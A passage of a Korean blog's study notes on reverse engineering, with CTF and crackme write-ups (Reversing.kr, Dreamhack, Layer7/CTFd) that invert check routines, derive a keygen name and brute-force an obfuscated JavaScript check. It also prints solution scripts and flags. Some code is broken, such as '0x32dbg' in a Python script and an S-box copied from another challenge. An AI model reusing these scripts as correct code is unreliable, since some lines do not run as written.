코드를 보면 flag.png 파일을 읽어와 1byte씩 xor 및 더하기 연산을 해주는 것을 확인할 수 있다.\nPython으로 역연산하여 flag.png를 복호화하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 with open(\u0026#34;./encrypted\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() key = [0xDE, 0xAD, 0xBE, 0xEF, 0x00] decrypted = [] for i in range(len(data)): decrypted.append(((data[i] - 19) ^ key[i % 4]) \u0026amp; 0xFF) with open(\u0026#34;flag.png\u0026#34;, \u0026#34;ab\u0026#34;) as f: f.write(bytes(decrypted)) 복호화된 flag.png 열어보면 플래그를 확인할 수 있다.\nReversing.kr 문제 풀이 Easy Crack 디컴파일된 코드를 확인해보면, Windows API로 만든 GUI 프로그램이기 때문에 WinMain 함수를 확인할 수 있다.\nDialogFunc 함수를 확인해보면 종료 조건과 아래는 어떤 함수를 호출해주는 것을 볼 수 있다.\n확인해보면 조건문을 만족하면 MessageBoxA 함수를 aIncorrectPassw를 인자로 반환한다.\n따라서 조건문을 만족하지 않도록 하는 String 값을 구해야한다.\n1 2 3 4 String[1] != 97 // a strncmp(\u0026amp;String[2], Str2, 2u) // Str2 : 5y strcmp(\u0026amp;String[4], aR3versing) // aR3versing : R3versing String[0] != 69 // 69 : E 따라서 String의 값은 \u0026ldquo;Ea5yR3versing\u0026quot;이다.\nEasy Keygen Find the Name when the Serial is 5B134977135E7D13\n해당 시리얼의 이름을 알아내야 하는 것 같다.\n디컴파일된 코드를 확인해보면 v8에 이름을 입력받고, 이 값을 이용해 Buffer에 v8[v3++] ^ v7[i - 1] 값을 Hex 문자열 형태로 저장한다.\n다음으로 v8에 시리얼을 입력받아, 이를 Buffer와 비교하여 같으면 Correct를 호출하게 된다.\n시리얼 값을 알고 있기 때문에 이를 바탕으로 이름을 역연산하여 구할 수 있다.\n1 2 3 4 5 6 7 8 Serial = [0x5B, 0x13, 0x49, 0x77, 0x13, 0x5E, 0x7D, 0x13] v7 = [0x10, 0x20, 0x30] # v6, v7 두 배열을 인덱스를 한 칸 미뤄서 하나의 배열로 사용. # v6 = v7[-1] = 16 = 0x10 # v7 = \u0026#34; 0\u0026#34;, \u0026#39; \u0026#39; = 0x20, \u0026#39;0\u0026#39; = 0x30 for i in range(len(Serial)): print(chr(Serial[i] ^ v7[i % 3]), end=\u0026#34;\u0026#34;) Easy Unpack Find the OEP\nex) 00401000\n문제 풀이 전, 언팩(Unpack)이란 압축되거나 암호화된, 즉 Packed 파일에서 동적으로 원래 파일로 압축을 해제하거나 복호화하여 실행하는 것을 말한다. 프로그램 실행 중에 암호화된 프로그램이 동적으로 복호화되기 때문에 정적 분석으로는 프로그램을 분석할 수 없다.\n문제에서 OEP를 구하라고 하는데, OEP는 Original Entry Point의 약자로, 언패킹이 된 후의 엔트리 포인트를 말한다.\n동적 분석으로 실행하다보면 엔트리 포인트를 찾을 수 있을 것이다.\nx32dbg로 계속해서 한 줄씩 실행하다 보면, 위와 같이 다른 주소로 실행 흐름이 바뀌는 것을 확인할 수 있다.\n해당 주소를 확인해보면 함수 프롤로그와 GetVersion, GetCommandLineA와 같은 API 호출 등을 확인할 수 있는데, 이를 통해 이 주소가 엔트리 포인트임을 알 수 있다.\n따라서 OEP는 00401150이다.\nEasy ELF 디컴파일된 코드를 확인해보면, sub_8048434 함수는 scanf()이고 sub_8048451 함수의 반환값에 따라 결과가 달라지는 것을 알 수 있다.\nsub_8048451 함수를 확인해보면, 입력을 받아온 값을 xor 연산을 한 뒤 특정 값과 비교하여 같으면 1을 반환 시키는 것으로 보인다.\nPython으로 역연산하여 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 bytes = [120 ^ 0x34, 49, 124 ^ 0x32dbg, (-35 ^ 0x88) \u0026amp; 0xFF, 88, 1] for i in range(len(bytes)): print(chr(bytes[i]), end=\u0026#34;\u0026#34;) ","date":"2025-07-04T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-8%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 8차시"},{"content":"CTFd 문제 풀이 정리 Custom 2 디컴파일된 main 함수를 보면 입력받은 값인 s와 암호화된 값인 vars0을 비교하는 것을 확인할 수 있다.\n그런데 입력받은 값이 암호화되는 것이 아니라 암호화된 값과 입력받은 값을 비교하는 것이라, 암호화된 값이 플래그인 것인데, 이렇게 되면 플래그가 동적으로 생성되기 때문에 gdb로 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 pwndbg\u0026gt; b __printf_chk Breakpoint 1 at 0x10f0 pwndbg\u0026gt; r Starting program: /home/t43w00/Documents/Layer7/Reversing/R7/challenge2(2) [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Breakpoint 1, ___printf_chk (flag=1, format=0x555555556004 \u0026#34;Enter flag: \u0026#34;) at ./debug/printf_chk.c:25 warning: 25 ./debug/printf_chk.c: No such file or directory LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA ───────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────── RAX 0 RBX 0x7fffffffdfe8 —▸ 0x7fffffffe278 ◂— \u0026#39;/home/t43w00/Documents/Layer7/Reversing/R7/challenge2(2)\u0026#39; RCX 0xfffff17d RDX 0x40 RDI 1 RSI 0x555555556004 ◂— \u0026#39;Enter flag: \u0026#39; R8 0 R9 0x7ffff7fca380 (_dl_fini) ◂— endbr64 R10 0x7fffffffdbe0 ◂— 0x800000 R11 0x203 R12 1 R13 0 R14 0x555555557d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555552a0 (__do_global_dtors_aux) ◂— endbr64 R15 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x7fffffffdd50 ◂— \u0026#39;Layer7{V2luZG93IHNlYXRzIGFzIHRoZSBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#39; RSP 0x7fffffffdd48 —▸ 0x555555555169 (main+105) ◂— lea r12, [rsp + 0x50] RIP 0x7ffff7ed8960 (__printf_chk) ◂— endbr64 ────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────── ► 0x7ffff7ed8960 \u0026lt;__printf_chk\u0026gt; endbr64 0x7ffff7ed8964 \u0026lt;__printf_chk+4\u0026gt; push rbp 0x7ffff7ed8965 \u0026lt;__printf_chk+5\u0026gt; mov rbp, rsp RBP =\u0026gt; 0x7fffffffdd40 —▸ 0x7fffffffdd50 ◂— \u0026#39;Layer7{V2luZG93IHNlYXRzIGFzIHRoZSBwbGFuZSBzdGFydHM...\u0026#39; 0x7ffff7ed8968 \u0026lt;__printf_chk+8\u0026gt; sub rsp, 0xd0 RSP =\u0026gt; 0x7fffffffdc70 (0x7fffffffdd40 - 0xd0) 0x7ffff7ed896f \u0026lt;__printf_chk+15\u0026gt; mov qword ptr [rbp - 0xa0], rdx [0x7fffffffdca0] \u0026lt;= 0x40 0x7ffff7ed8976 \u0026lt;__printf_chk+22\u0026gt; mov qword ptr [rbp - 0x98], rcx [0x7fffffffdca8] \u0026lt;= 0xfffff17d 0x7ffff7ed897d \u0026lt;__printf_chk+29\u0026gt; mov qword ptr [rbp - 0x90], r8 [0x7fffffffdcb0] \u0026lt;= 0 0x7ffff7ed8984 \u0026lt;__printf_chk+36\u0026gt; mov qword ptr [rbp - 0x88], r9 [0x7fffffffdcb8] \u0026lt;= 0x7ffff7fca380 (_dl_fini) ◂— endbr64 0x7ffff7ed898b \u0026lt;__printf_chk+43\u0026gt; test al, al 0 \u0026amp; 0 EFLAGS =\u0026gt; 0x246 [ cf PF af ZF sf IF df of ] 0x7ffff7ed898d \u0026lt;__printf_chk+45\u0026gt; ✔ je __printf_chk+79 \u0026lt;__printf_chk+79\u0026gt; ↓ 0x7ffff7ed89af \u0026lt;__printf_chk+79\u0026gt; mov rax, qword ptr fs:[0x28] RAX, [0x7ffff7d9e768] =\u0026gt; 0x6228d2d69f191400 ─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdd48 —▸ 0x555555555169 (main+105) ◂— lea r12, [rsp + 0x50] 01:0008│ rbp 0x7fffffffdd50 ◂— \u0026#39;Layer7{V2luZG93IHNlYXRzIGFzIHRoZSBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#39; 02:0010│+008 0x7fffffffdd58 ◂— \u0026#39;2luZG93IHNlYXRzIGFzIHRoZSBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#39; 03:0018│+010 0x7fffffffdd60 ◂— \u0026#39;HNlYXRzIGFzIHRoZSBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#39; 04:0020│+018 0x7fffffffdd68 ◂— \u0026#39;GFzIHRoZSBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#39; 05:0028│+020 0x7fffffffdd70 ◂— \u0026#39;SBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#39; 06:0030│+028 0x7fffffffdd78 ◂— \u0026#39;SBzdGFydHMgbGVhdmluJw==}\u0026#39; 07:0038│+030 0x7fffffffdd80 ◂— \u0026#39;HMgbGVhdmluJw==}\u0026#39; ───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► 0 0x7ffff7ed8960 __printf_chk 1 0x555555555169 main+105 2 0x7ffff7dcb1ca __libc_start_call_main+122 3 0x7ffff7dcb28b __libc_start_main+139 4 0x555555555225 _start+37 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; x/s $rbp 0x7fffffffdd50: \u0026#34;Layer7{V2luZG93IHNlYXRzIGFzIHRoZSBwbGFuZSBzdGFydHMgbGVhdmluJw==}\u0026#34; pwndbg\u0026gt; 암호화가 끝나고 나서 호출되는 __printf_chk에 중단점을 걸고 실행하면 스택 프레임에서 플래그를 확인할 수 있다.\nCustom 3 main 함수를 확인해보면 s1에 저장된 값과 입력받은 s를 비교하는 것을 알 수 있다.\n따라서 s1의 저장된 값을 입력하면 Correct가 출력된다.\n1 2 3 4 5 6 7 8 9 10 11 Layer7/Reversing/R7 ❯ ls challenge3 flag Layer7/Reversing/R7 ❯ cat flag �����撫\u0026#34;wt���HtI ���ל���XUBd0Ϧ����ҸWgBY#���ש�Ѳ{Y]_Z��������~RId␦�������G\u0026amp;@ Layer7/Reversing/R7 ❯ ./challenge3 \u0026lt; flag Enter flag: Correct! 근데 플래그는 아니고, funcs_1E5B를 보면 sub_1AC5 함수를 제외하고 다 같은 함수이고, sub_1AC5 함수만 조금 다른 것을 알 수 있는데, 이 함수는 strlen(s) % 11;가 8일 때 호출된다.\n따라서 이 수상한 함수를 보면 위 4개 함수는 쓸데없는 함수고, 마지막 xor 연산만 해주면 플래그가 나온다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; long long v2[15]; unsigned char *ptr = (unsigned char*)v2; unsigned char tmp; unsigned char bytes[16] = { 0x10, 0x1F, 0x2E, 0x3D, 0x4C, 0x5B, 0x6A, 0x79, 0x88, 0x97, 0xA6, 0xB5, 0xC4, 0xD3, 0xE2, 0xF1 }; int main(void) { v2[0] = 0x2F116C3E58577E5C; v2[1] = 0xA89691BDD6D6FFCF; v2[2] = 0x1D0D0E2164497448; v2[3] = 0xAB92E683FCCAFFCF; v2[4] = 0x20050904741E7722; v2[5] = 0xAB85B89CD7C1C6D0; v2[6] = 0x30106A1B64425558; v2[7] = 0xB8D2BBF6EFD6A6CF; v2[8] = 0x231E190F59426757; v2[9] = 0xB2D1EAA9D7D4D5DB; v2[10] = 0x185A190F5F5D597B; v2[11] = 0x928A81F7D6C1C2CF; v2[12] = 0x1A1D19146449527E; v2[13] = 0x9485B4F6ECCEAEE5; v2[14] = 0x401F2647; for (int i = 0; i \u0026lt;= 115; ++i) { ptr[i] ^= bytes[i % 16]; } for (int i = 0; i \u0026lt;= 115; ++i) { cout \u0026lt;\u0026lt; ptr[i]; } return 0; } 사실 funcs_1E5B[v4]();에 인자가 없어서 정상적인 방법으로는 풀이가 불가능하지만, 인자로 s1이 있다고 생각하고 풀이했다.\n","date":"2025-06-22T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-7%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 7차시"},{"content":"드림핵 워게임 풀이 정리 Secure Mail 문제 파일을 열어보니 생년월일을 입력받는 웹 페이지다. 특정 생년월일을 입력해야 플래그를 획득할 수 있는 것 같다.\n소스 코드를 확인해보았는데 코드가 난독화 되어있어 알아보기 어렵다.\n1 \u0026lt;button type=\u0026#34;submit\u0026#34; onclick=\u0026#34;_0x9a220(pass.value);\u0026#34;\u0026gt;Confirm\u0026lt;/button\u0026gt; 아래 부분에 위 코드를 보면, 버튼을 클릭했을 때 입력받은 값을 인자로 _0x9a220 함수를 호출하는 것을 확인할 수 있다.\n따라서 _0x9a220 함수의 인자에 생년월일 형식의 값을 무차별 대입하면 될 것 같다.\n개발자 도구의 콘솔을 통해 자바스크립트 코드를 실행하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 window.alert = function () {} // alert override var date = 991231; var result = 0; while (date \u0026gt; 0) { if (result == true) {break;} else if ((date % 10000) \u0026lt;= 101) {date -= 8870;} else if ((date % 100) \u0026lt;= 1) {date -= 70;} else {date -= 1;} result = _0x9a220(date); console.log(date); } fake 여러 함수가 있는데 ptr의 값이 저장되는 sub_140B 함수부터 확인해보았다.\nv3 배열과 v4의 문자열, v5 값이 저장되어 있는 값을 이어서 ptr 변수의 위치부터 차례대로 저장한다.\n나머지 세 함수 중 두 함수는 ptr 포인터의 위치와 연관이 없는 값들이라 볼 필요가 없다.\n두 번째 함수를 보면 ptr에 직접적인 연산이 되는 세 함수가 있는데, 하나씩 확인해보겠다.\n첫 번째 함수는 a1[i]와 a1[a1[1] - i - 1]의 값을 바꾸는 코드를 반복하는 함수인데, a1[1]에는 문자열의 길이인 0x17이 저장되어 있다.\n두 번째 함수는 a1[i]와 a1[i+1]의 값을 바꾸는 함수이다.\n세 번째 함수는 a1[i]에 a2와 xor 연산을 한 값을 저장한다.\n위 과정을 cpp을 이용하여 코드로 구현하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { long long v3[3]; v3[0] = 0x595468565F5B5B4ALL; v3[1] = 0x6841044552064450LL; v3[2] = 0; unsigned char *ptr = (unsigned char*)v3; ptr[0x10] = \u0026#39;e\u0026#39;; ptr[0x11] = \u0026#39;z\u0026#39;; ptr[0x12] = \u0026#39;t\u0026#39;; ptr[0x13] = \u0026#39;L\u0026#39;; ptr[0x14] = \u0026#39;d\u0026#39;; ptr[0x15] = \u0026#39;s\u0026#39;; ptr[0x16] = 127; ptr[0x17] = 0; unsigned char tmp; for (int i = 0; i \u0026lt; 23 / 2; i++) { tmp = ptr[i]; ptr[i] = ptr[23 - 1 - i]; ptr[23 - 1 - i] = tmp; } for (int i = 0; i + 1 \u0026lt; 23; i += 2) { unsigned char tmp = ptr[i]; ptr[i] = ptr[i + 1]; ptr[i + 1] = tmp; } for (int i = 0; i \u0026lt; 23; i++) { ptr[i] ^= 55; } for (int i = 0; i \u0026lt; 0x17; i++) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(ptr[i]); } return 0; } please, please, please 1 2 ❯ strings ./chall | grep DH{ DH{***} 문자열을 추출하면 플래그가 나온다.\nCTFd 문제 풀이 정리 Custom 1 check1 함수의 반환값이 1이 되어야 한다.\nif문 안의 *(_BYTE *)(a1 + v2) - ((v1 ^ 0xA6) + 4 * (_BYTE)v2) != v3 이 식을 만족하지 않고, v2를 카운터로 사용할 때까지 80번 반복한다.\n해당 식을 정리하면 a1[v2] - (v1 ^ 0xA6) + 4 * v2 != v3이 되는데, 구하기 위한 a1 배열을 남기고 나머지를 이항하면 ((v1 ^ 0xA6) + 4 * v2 + v3[v2])가 알맞은 입력값이 된다.\ncpp를 이용하여 출력하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { unsigned char v3[80] = { 0xA6, 0x62, 0x55, 0xA8, 0x90, 0xAC, 0xDB, 0x0A, 0xE5, 0x3B, 0x07, 0xDD, 0x09, 0x03, 0x8B, 0x49, 0x8D, 0x38, 0x01, 0xCD, 0x26, 0xFF, 0xBC, 0x0A, 0xEB, 0x2B, 0x31, 0x84, 0x5D, 0xD5, 0xBB, 0xE8, 0xC1, 0x8D, 0xF1, 0xAC, 0x05, 0x0D, 0x76, 0x3B, 0x9F, 0x6E, 0xDB, 0x74, 0x4D, 0xB1, 0xA0, 0xF0, 0xC1, 0x05, 0x13, 0x77, 0x45, 0x7A, 0x20, 0x28, 0x79, 0x80, 0xCB, 0x9E, 0xF9, 0xBF, 0x55, 0x21, 0x4D, 0x17, 0x11, 0x5D, 0x21, 0x77, 0x8F, 0xD1, 0xAA, 0x02, 0xE2, 0x7E, 0xFD, 0xAA, 0x15, 0x2C }; int v1 = 0; for (int i = 0; i \u0026lt; 80; i++) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(((v1 ^ 0xA6) + 4 * i + v3[i]) \u0026amp; 0xFF); v1 += 93; } return 0; } Custom 2 check2 함수의 반환값이 1이 되어야 한다.\n__ROL1__(*(_BYTE *)(a1 + v2) ^ (3 * v2), (unsigned int)v2 % 7 + 1) != v3 식이 false가 되어야 만족하고, v2를 카운터로 사용하여 168번 반복하게 된다.\n따라서 이를 역으로 연산한 식인 ror(data[i], v2 % 7 + 1) ^ (3 * v2)이 알맞은 입력값이 된다.\ncpp를 사용하여 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;iostream\u0026gt; using namespace std; unsigned char ror(unsigned char x, int n) { return (x \u0026gt;\u0026gt; n) | (x \u0026lt;\u0026lt; (8 - n)); } int main() { unsigned char data[168] = { 0x98, 0x89, 0xFB, 0xC6, 0xCF, 0x0E, 0xB4, 0x8E, 0x01, 0x0A, 0x27, 0x68, 0x53, 0xB2, 0xBC, 0x21, 0x1B, 0x17, 0x89, 0xD6, 0xB5, 0xF2, 0xC4, 0x39, 0xB0, 0x21, 0x48, 0x85, 0x06, 0x44, 0x19, 0x93, 0x64, 0x48, 0x95, 0x10, 0xEC, 0xD8, 0xE1, 0x87, 0xCF, 0x1F, 0x32, 0x8B, 0xB5, 0x6B, 0x5C, 0xFB, 0xEB, 0xC9, 0xC7, 0xEF, 0xEA, 0x3B, 0x24, 0xFF, 0xF7, 0xA7, 0xF6, 0x3D, 0x5B, 0x7E, 0x65, 0xCF, 0x1E, 0xB4, 0x1A, 0x15, 0x25, 0x4F, 0x6B, 0x1A, 0x04, 0xA8, 0x37, 0x2E, 0x45, 0x5B, 0x1A, 0xA5, 0x7A, 0xF0, 0x23, 0x58, 0x77, 0xE6, 0xBB, 0xF5, 0x69, 0x52, 0xBB, 0xE6, 0x98, 0x7B, 0x96, 0xCF, 0x56, 0xB0, 0xAC, 0x2D, 0x2A, 0x85, 0xAA, 0x58, 0xB7, 0xDA, 0x35, 0x29, 0xC0, 0x41, 0x4B, 0x16, 0x0E, 0x99, 0x33, 0xB3, 0xA4, 0x47, 0xAB, 0x0E, 0x6D, 0xF1, 0x02, 0x46, 0xC7, 0x27, 0x1E, 0x7C, 0x46, 0x8E, 0x3C, 0x7B, 0xE5, 0xCF, 0xFB, 0xBF, 0x1F, 0x9D, 0x7E, 0x79, 0xEF, 0x97, 0x06, 0x4F, 0xFC, 0xE1, 0xE8, 0xB5, 0x3A, 0x4F, 0xEA, 0x91, 0xE3, 0x7D, 0xF7, 0x62, 0x9C, 0x18, 0x5D, 0xE1, 0x5C, 0x53, 0x4E, 0x44, 0x4B, 0xB7, 0xF1, 0x44 }; for (int i = 0; i \u0026lt; 168; i++) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(ror(data[i], i % 7 + 1) ^ ((3 * i) \u0026amp; 0xFF)); } return 0; } Custom 3 check3 함수에서 1이 반환되어야 함을 알 수 있다.\nsbox[*(unsigned __int8 *)(a1 + v3)] != v2 이 식을 만족하는 값을 찾아야 하는데, v1을 카운터로 사용하여 v1이 100이 될 때까지 반복한다.\n이 식을 정리하면 sbox[a1[v3]] != v2이 되는데, 무차별 대입으로 sbox[j] = enc3[i]가 만족하는 값을 찾으면, j의 값이 a1[perm[i]]이기 때문에, a1[perm[i]] 값에 j를 저장하면 a1 배열을 구할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #include \u0026lt;iostream\u0026gt; using namespace std; unsigned char sbox[256] = { 0x98, 0x89, 0xFB, 0xC6, 0xCF, 0x0E, 0xB4, 0x8E, 0x01, 0x0A, 0x27, 0x68, 0x53, 0xB2, 0xBC, 0x21, 0x1B, 0x17, 0x89, 0xD6, 0xB5, 0xF2, 0xC4, 0x39, 0xB0, 0x21, 0x48, 0x85, 0x06, 0x44, 0x19, 0x93, 0x64, 0x48, 0x95, 0x10, 0xEC, 0xD8, 0xE1, 0x87, 0xCF, 0x1F, 0x32, 0x8B, 0xB5, 0x6B, 0x5C, 0xFB, 0xEB, 0xC9, 0xC7, 0xEF, 0xEA, 0x3B, 0x24, 0xFF, 0xF7, 0xA7, 0xF6, 0x3D, 0x5B, 0x7E, 0x65, 0xCF, 0x1E, 0xB4, 0x1A, 0x15, 0x25, 0x4F, 0x6B, 0x1A, 0x04, 0xA8, 0x37, 0x2E, 0x45, 0x5B, 0x1A, 0xA5, 0x7A, 0xF0, 0x23, 0x58, 0x77, 0xE6, 0xBB, 0xF5, 0x69, 0x52, 0xBB, 0xE6, 0x98, 0x7B, 0x96, 0xCF, 0x56, 0xB0, 0xAC, 0x2D, 0x2A, 0x85, 0xAA, 0x58, 0xB7, 0xDA, 0x35, 0x29, 0xC0, 0x41, 0x4B, 0x16, 0x0E, 0x99, 0x33, 0xB3, 0xA4, 0x47, 0xAB, 0x0E, 0x6D, 0xF1, 0x02, 0x46, 0xC7, 0x27, 0x1E, 0x7C, 0x46, 0x8E, 0x3C, 0x7B, 0xE5, 0xCF, 0xFB, 0xBF, 0x1F, 0x9D, 0x7E, 0x79, 0xEF, 0x97, 0x06, 0x4F, 0xFC, 0xE1, 0xE8, 0xB5, 0x3A, 0x4F, 0xEA, 0x91, 0xE3, 0x7D, 0xF7, 0x62, 0x9C, 0x18, 0x5D, 0xE1, 0x5C, 0x53, 0x4E, 0x44, 0x4B, 0xB7, 0xF1, 0x44 }; unsigned char perm[100] = { 0x2A, 0x29, 0x5B, 0x09, 0x41, 0x32, 0x01, 0x46, 0x0F, 0x4E, 0x49, 0x0A, 0x37, 0x38, 0x48, 0x2D, 0x30, 0x5C, 0x4C, 0x25, 0x1E, 0x15, 0x20, 0x60, 0x50, 0x31, 0x53, 0x1A, 0x57, 0x21, 0x08, 0x2F, 0x3B, 0x3F, 0x4A, 0x2C, 0x62, 0x34, 0x55, 0x0C, 0x24, 0x17, 0x27, 0x28, 0x12, 0x42, 0x3D, 0x3C, 0x07, 0x22, 0x63, 0x2E, 0x02, 0x33, 0x10, 0x26, 0x3A, 0x44, 0x16, 0x3E, 0x18, 0x05, 0x06, 0x43, 0x52, 0x13, 0x4F, 0x2B, 0x5A, 0x14, 0x00, 0x5F, 0x39, 0x5D, 0x35, 0x59, 0x19, 0x47, 0x54, 0x4D, 0x40, 0x1D, 0x1B, 0x58, 0x61, 0x04, 0x36, 0x4B, 0x0B, 0x45, 0x56, 0x0D, 0x11, 0x1C, 0x1F, 0x23, 0x5E, 0x03, 0x0E, 0x51 }; unsigned char enc3[128] = { 0x83, 0x67, 0x34, 0x06, 0x94, 0x3C, 0xDB, 0x83, 0x34, 0x3C, 0xE4, 0x3C, 0x34, 0x49, 0x9A, 0x2B, 0x6B, 0x9A, 0x6B, 0x9D, 0x3C, 0x6A, 0x53, 0x0D, 0x6B, 0x60, 0xDD, 0x35, 0x18, 0x45, 0x53, 0xDB, 0x34, 0x18, 0x69, 0xC5, 0x1A, 0x53, 0xE4, 0x9A, 0xCB, 0x3B, 0xCB, 0xCB, 0x35, 0x07, 0xA6, 0xB4, 0xCB, 0x6E, 0x09, 0x69, 0xC7, 0x64, 0xC7, 0x3C, 0x83, 0x53, 0xA5, 0x69, 0xEC, 0x03, 0xF9, 0x06, 0x93, 0x18, 0x6A, 0xDD, 0xFB, 0x35, 0xCF, 0xF6, 0x59, 0x08, 0x5E, 0x2B, 0x59, 0xDD, 0x9A, 0x60, 0xDF, 0xC3, 0x06, 0xC5, 0x55, 0x41, 0xE4, 0xDB, 0x67, 0xA1, 0xE4, 0x69, 0x59, 0xDF, 0x18, 0x3B, 0xA1, 0x64, 0xFB, 0xA6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; unsigned char a1[256]; int main() { for (int i = 0; i \u0026lt; 100; i++) { char v3 = perm[i]; char v2 = enc3[i]; for (int j = 0; j \u0026lt; 256; j++) { if (sbox[j] == v2) { a1[v3] = j; } } } for (int i = 0; i \u0026lt; 100; i++) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(a1[i]); } return 0; } ","date":"2025-06-17T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-6%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 6차시"},{"content":"수업 내용 정리 IDA란? Interactive DisAssembler의 약자로, 기계어를 어셈블리어로 변환해주는 프로그램이다.\n디컴파일러가 매우 강력하다. 하지만 그만큼 비싸다.\n주요 탭 Function 함수들의 목록을 보여준다. 클릭 시 해당 함수의 주소로 이동할 수 있다.\n보라색은 외부 라이브러리의 함수이고, 나머지는 사용자가 정의한 함수이다.\nGraph view 어셈블리어 코드의 흐름을 그래프로 보여준다. 분기문이 많은 어셈블리어 코드를 볼 때 매우 효과적이다.\nText view 텍스트로만 되어있는 어셈블리어 코드이다. 주소 순으로 섹션과 코드를 볼 수 있어 원하는 값을 찾기에 편리하다.\nHex view Text view에서 볼 수 있는 어셈블리어 코드를 Hex(16진수)값으로 볼 수 있다. 값을 복사해오거나 오른쪽 아스키로 변환된 값을 참고할 때 자주 쓰인다.\n주요 단축키 Shift + F12 프로그램 내 문자열들의 정보들을 알려주는 Strings 탭을 열 수 있다.\nN 변수나 함수의 이름을 리네임 할 수 있다.\nY 함수의 프로토타입을 수정할 수 있다. 함수나 매개변수의 이름을 바꾸거나 자료형을 바꿀 때 사용된다.\nDreamhack rev-basic-1~6 rev-basic-1 실행을 해보니 입력을 받고 판별 후 결과를 출력하는 것으로 보인다.\n분석을 위해 IDA로 프로그램을 열어보았다.\n1 2 3 4 5 6 7 8 9 lea rcx, aInput ; \u0026#34;Input : \u0026#34; call sub_1400013E0 lea rdx, [rsp+138h+var_118] lea rcx, a256s ; \u0026#34;%256s\u0026#34; call sub_140001440 lea rcx, [rsp+138h+var_118] call sub_140001000 test eax, eax jz short loc_1400013B6 위 코드를 보면, 사용자에게 [rsp+138h+var_118]에 입력을 받고, 이를 인자로 sub_140001000 함수를 호출하여 그 값이 0인지 아닌지에 따라 분기하는 것을 확인할 수 있다.\nsub_140001000 함수를 확인해보았다.\n같은 구조의 여러 코드가 있고, 끝까지 조건에 맞게 분기하면 1을 반환하고 아닌 경우에는 0을 반환하도록 되어있다.\n첫 블럭부터 네 번째 블럭까지 확인해보니, n번째 블럭에서 인자의 n번째 인덱스 값을 특정 문자와 비교하여 같은 경우에 분기하는 것을 확인할 수 있다.\n첫 번째 블럭부터 마지막 블럭까지 각각 비교하는 문자를 조합하면 전체 문자열이 나온다.\nrev-basic-2 전 문제와 똑같이 입력값을 검증하는 프로그램이므로 입력값을 검증하는 함수만 분석하도록 하겠다.\n코드를 보면 [rsp+18h+var_18]이 12가 될 때까지 rax를 카운터로 1씩 증가시키며 aC[rax * 4]와 입력받은 문자열의 인덱스를 비교하여 같은지 비교하는 것을 알 수 있다.\n따라서 aC 배열의 4의 배수 인덱스에 해당하는 값을 가져와 조합하면 알맞은 입력값을 알아낼 수 있다.\nrev-basic-3 전 문제와 똑같이 rax를 카운터로 사용하고 18이 될 때까지 특정 연산 후에 비교하는 것을 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 movsxd rax, [rsp+18h+var_18] ; rax = i (카운터로 사용) lea rcx, 